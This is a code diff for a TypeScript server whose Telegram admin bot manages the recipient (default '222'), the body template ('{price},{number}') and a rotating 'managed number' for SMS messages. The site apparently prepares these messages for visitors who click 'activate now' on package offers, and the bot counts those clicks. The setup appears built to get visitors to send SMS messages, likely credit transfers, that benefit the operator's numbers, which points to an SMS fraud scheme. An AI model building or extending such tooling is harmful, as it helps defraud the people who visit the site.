@@ -10,15 +10,18 @@ if (process.env.NODE_ENV !== 'production') {
 
 const token = process.env.TELEGRAM_BOT_TOKEN;
 const adminChatId = process.env.TELEGRAM_CHAT_ID;
+const appUrl = process.env.APP_URL;
 
 let bot: TelegramBot | null = null;
 let totalClicks = 0;
-type PendingAction = 'add_number';
+type PendingAction = 'add_number' | 'set_target' | 'set_template';
 const pendingActions = new Map<number, PendingAction>();
 
 // Application State
 const appConfig = {
-  smsNumber: '7700000000' // Number injected into SMS body
+  smsNumber: '7700000000', // Managed number (selected from Telegram)
+  smsTarget: '222', // SMS receiver
+  smsTemplate: '{price},{number}', // Message shape
 };
 const smsNumbers: string[] = [appConfig.smsNumber];
 
@@ -51,6 +54,8 @@ function getMainMenuKeyboard(): TelegramBot.ReplyKeyboardMarkup {
     keyboard: [
       [{ text: '📱 عرض الأرقام' }, { text: '🔁 تبديل الرقم' }],
       [{ text: '➕ إضافة رقم' }, { text: '🗑️ حذف رقم' }],
+      [{ text: '🎯 تعيين المستلم' }, { text: '🧩 تعديل الهيكلية' }],
+      [{ text: '👀 معاينة الرسالة' }],
       [{ text: '📊 الإحصائيات' }, { text: '❓ مساعدة' }],
     ],
     resize_keyboard: true,
@@ -68,47 +73,37 @@ function getNumbersInlineKeyboard(mode: 'set' | 'remove'): TelegramBot.InlineKey
   };
 }
 
-if (token) {
-  try {
-    bot = new TelegramBot(token, {
-      polling: {
-        autoStart: false,
-        params: {
-          timeout: 10,
-        },
-      },
-    });
-    let pollingDisabledByConflict = false;
+function renderSmsBody(template: string, payload: { price: string; number: string; title: string; code: string }): string {
+  return template
+    .replaceAll('{price}', payload.price)
+    .replaceAll('{number}', payload.number)
+    .replaceAll('{title}', payload.title)
+    .replaceAll('{code}', payload.code);
+}
 
-    bot.on('polling_error', (error: any) => {
-      const message = String(error?.message ?? '');
-      const isConflict409 = error?.code === 'ETELEGRAM' && message.includes('409');
-      if (isConflict409 && !pollingDisabledByConflict) {
-        pollingDisabledByConflict = true;
-        console.warn('Telegram polling stopped due to 409 conflict (another bot instance is already polling).');
-        bot?.stopPolling().catch(stopError => {
-          console.error('Failed to stop Telegram polling after conflict:', stopError);
-        });
-        return;
-      }
+function getSmsConfigSummary(): string {
+  const preview = renderSmsBody(appConfig.smsTemplate, {
+    price: '45000',
+    number: appConfig.smsNumber,
+    title: 'الباقة الذهبية',
+    code: 'VIP45',
+  });
 
-      // Avoid noisy repeated conflict logs once polling has already been disabled.
-      if (!isConflict409) {
-        console.error('[telegram polling error]', error);
-      }
-    });
+  return `⚙️ إعدادات الرسالة الحالية:
+📨 المستلم: ${appConfig.smsTarget}
+🧩 الهيكلية: ${appConfig.smsTemplate}
+👀 معاينة: ${preview}
 
-    // Clear webhook mode (if set elsewhere) then start polling.
-    bot.deleteWebHook()
-      .catch((hookError) => {
-        console.warn('Could not clear Telegram webhook before polling:', hookError);
-      })
-      .finally(() => {
-        bot?.startPolling().catch((startError) => {
-          console.error('Failed to start Telegram polling:', startError);
-        });
-      });
-    
+المتغيرات المتاحة:
+{price} = سعر العرض
+{number} = الرقم النشط من البوت
+{title} = اسم الباقة
+{code} = كود التفعيل`;
+}
+
+function registerBotHandlers() {
+  if (!bot) return;
+
     // Command to change managed number directly (backward compatible)
     bot.onText(/\/setsms (.+)/, (msg, match) => {
       const chatId = msg.chat.id;
@@ -227,6 +222,45 @@ if (token) {
       bot?.sendMessage(chatId, `📊 إحصائيات التفعيل:\n\nإجمالي عدد النقرات على "تفعيل الآن": ${totalClicks}`);
     });
 
+    // Command to set SMS target number
+    bot.onText(/\/setsmstarget (.+)/, (msg, match) => {
+      const chatId = msg.chat.id;
+      if (!isAdmin(chatId)) return;
+      if (!match) return;
+
+      const target = normalizeSmsNumber(match[1]);
+      if (!target) {
+        bot?.sendMessage(chatId, '⚠️ الرجاء إدخال رقم مستلم صحيح.');
+        return;
+      }
+
+      appConfig.smsTarget = target;
+      bot?.sendMessage(chatId, `✅ تم تعيين رقم المستلم إلى: ${appConfig.smsTarget}\n\n${getSmsConfigSummary()}`);
+    });
+
+    // Command to set SMS template
+    bot.onText(/\/setsmstemplate (.+)/, (msg, match) => {
+      const chatId = msg.chat.id;
+      if (!isAdmin(chatId)) return;
+      if (!match) return;
+
+      const template = match[1].trim();
+      if (!template) {
+        bot?.sendMessage(chatId, '⚠️ القالب لا يمكن أن يكون فارغاً.');
+        return;
+      }
+
+      appConfig.smsTemplate = template;
+      bot?.sendMessage(chatId, `✅ تم تحديث هيكلية الرسالة.\n\n${getSmsConfigSummary()}`);
+    });
+
+    // Command to show current SMS config
+    bot.onText(/\/showsmsconfig/, (msg) => {
+      const chatId = msg.chat.id;
+      if (!isAdmin(chatId)) return;
+      bot?.sendMessage(chatId, getSmsConfigSummary());
+    });
+
     // Help command
     bot.onText(/\/start|\/help/, (msg) => {
       const chatId = msg.chat.id;
@@ -243,17 +277,23 @@ if (token) {
 /listsms - عرض جميع الأرقام مع تحديد الرقم النشط.
 /setnumber [index|number] - التبديل بين الأرقام (مثال: /setnumber 2).
 /removesms [index|number] - حذف رقم من القائمة.
+/setsmstarget [number] - تعيين رقم مستلم الرسالة (To).
+/setsmstemplate [template] - تعيين هيكلية نص الرسالة.
+/showsmsconfig - عرض إعدادات الرسالة الحالية.
 /stats - لعرض إجمالي عدد النقرات على زر التفعيل.
 
 صيغة الإرسال الحالية في الموقع:
-إلى: 222 (ثابت)
-نص الرسالة: سعر_العرض,الرقم_النشط
+إلى: يتم تحديده من إعدادات التليجرام
+نص الرسالة: يتم توليده من القالب
 
 واجهة الأزرار:
 - 📱 عرض الأرقام
 - ➕ إضافة رقم
 - 🔁 تبديل الرقم
 - 🗑️ حذف رقم
+- 🎯 تعيين المستلم
+- 🧩 تعديل الهيكلية
+- 👀 معاينة الرسالة
       `;
       bot?.sendMessage(chatId, helpText, { reply_markup: getMainMenuKeyboard() });
     });
@@ -280,6 +320,28 @@ if (token) {
         smsNumbers.push(candidate);
         pendingActions.delete(chatId);
         bot?.sendMessage(chatId, `✅ تمت إضافة الرقم: ${candidate}\n\n📋 القائمة الحالية:\n${formatNumbersList()}`);
+        return;
+      }
+      if (pendingAction === 'set_target') {
+        const target = normalizeSmsNumber(msg.text);
+        if (!target) {
+          bot?.sendMessage(chatId, '⚠️ رقم المستلم غير صالح. أرسل رقم صحيح.');
+          return;
+        }
+        appConfig.smsTarget = target;
+        pendingActions.delete(chatId);
+        bot?.sendMessage(chatId, `✅ تم تعيين رقم المستلم إلى: ${appConfig.smsTarget}\n\n${getSmsConfigSummary()}`);
+        return;
+      }
+      if (pendingAction === 'set_template') {
+        const template = msg.text.trim();
+        if (!template) {
+          bot?.sendMessage(chatId, '⚠️ القالب لا يمكن أن يكون فارغاً.');
+          return;
+        }
+        appConfig.smsTemplate = template;
+        pendingActions.delete(chatId);
+        bot?.sendMessage(chatId, `✅ تم تحديث هيكلية الرسالة.\n\n${getSmsConfigSummary()}`);
         return;
       }
 
@@ -314,6 +376,30 @@ if (token) {
 
       if (msg.text === '📊 الإحصائيات') {
         bot?.sendMessage(chatId, `📊 إحصائيات التفعيل:\n\nإجمالي عدد النقرات على "تفعيل الآن": ${totalClicks}`, {
+          reply_markup: getMainMenuKeyboard(),
+        });
+        return;
+      }
+      if (msg.text === '🎯 تعيين المستلم') {
+        pendingActions.set(chatId, 'set_target');
+        bot?.sendMessage(chatId, '✍️ أرسل الآن رقم المستلم الذي تذهب إليه رسالة SMS:', {
+          reply_markup: getMainMenuKeyboard(),
+        });
+        return;
+      }
+
+      if (msg.text === '🧩 تعديل الهيكلية') {
+        pendingActions.set(chatId, 'set_template');
+        bot?.sendMessage(
+          chatId,
+          `✍️ أرسل الآن هيكلية الرسالة.\n\nمثال:\n{price},{number}\nأو\n({title})-{number}-{code}\n\n${getSmsConfigSummary()}`,
+          { reply_markup: getMainMenuKeyboard() }
+        );
+        return;
+      }
+
+      if (msg.text === '👀 معاينة الرسالة') {
+        bot?.sendMessage(chatId, getSmsConfigSummary(), {
           reply_markup: getMainMenuKeyboard(),
         });
         return;
@@ -373,12 +459,53 @@ if (token) {
       }
     });
 
-    console.log('Telegram Bot initialized successfully.');
-  } catch (error) {
-    console.error('Failed to initialize Telegram Bot:', error);
-  }
-} else {
-  console.warn('TELEGRAM_BOT_TOKEN is not set. Telegram features will be disabled.');
+  console.log('Telegram Bot handlers registered.');
+}
+
+function setupPollingMode() {
+  if (!bot) return;
+  let pollingDisabledByConflict = false;
+
+  bot.on('polling_error', (error: any) => {
+    const message = String(error?.message ?? '');
+    const isConflict409 = error?.code === 'ETELEGRAM' && message.includes('409');
+    if (isConflict409 && !pollingDisabledByConflict) {
+      pollingDisabledByConflict = true;
+      console.warn('Telegram polling stopped due to 409 conflict (another bot instance is already polling).');
+      bot?.stopPolling().catch(stopError => {
+        console.error('Failed to stop Telegram polling after conflict:', stopError);
+      });
+      return;
+    }
+
+    if (!isConflict409) {
+      console.error('[telegram polling error]', error);
+    }
+  });
+
+  bot.deleteWebHook()
+    .catch((hookError) => {
+      console.warn('Could not clear Telegram webhook before polling:', hookError);
+    })
+    .finally(() => {
+      bot?.startPolling().catch((startError) => {
+        console.error('Failed to start Telegram polling:', startError);
+      });
+    });
+}
+
+async function setupWebhookMode(app: express.Express) {
+  if (!bot || !token || !appUrl) return;
+  const webhookPath = `/telegram/${token}`;
+  const webhookUrl = `${appUrl}${webhookPath}`;
+
+  app.post(webhookPath, (req, res) => {
+    bot?.processUpdate(req.body);
+    res.sendStatus(200);
+  });
+
+  await bot.setWebHook(webhookUrl);
+  console.log(`Telegram webhook set: ${webhookUrl}`);
 }
 
 async function startServer() {
@@ -386,6 +513,34 @@ async function startServer() {
   const PORT = 3000;
 
   app.use(express.json());
+
+  if (token) {
+    try {
+      const useWebhookInProduction = process.env.NODE_ENV === 'production' && !!appUrl;
+      bot = new TelegramBot(token, useWebhookInProduction ? {} : {
+        polling: {
+          autoStart: false,
+          params: {
+            timeout: 10,
+          },
+        },
+      });
+
+      registerBotHandlers();
+
+      if (useWebhookInProduction) {
+        await setupWebhookMode(app);
+      } else {
+        setupPollingMode();
+      }
+
+      console.log('Telegram Bot initialized successfully.');
+    } catch (error) {
+      console.error('Failed to initialize Telegram Bot:', error);
+    }
+  } else {
+    console.warn('TELEGRAM_BOT_TOKEN is not set. Telegram features will be disabled.');
+  }
 
   // API to get current configuration
   app.get('/api/config', (req, res) => {
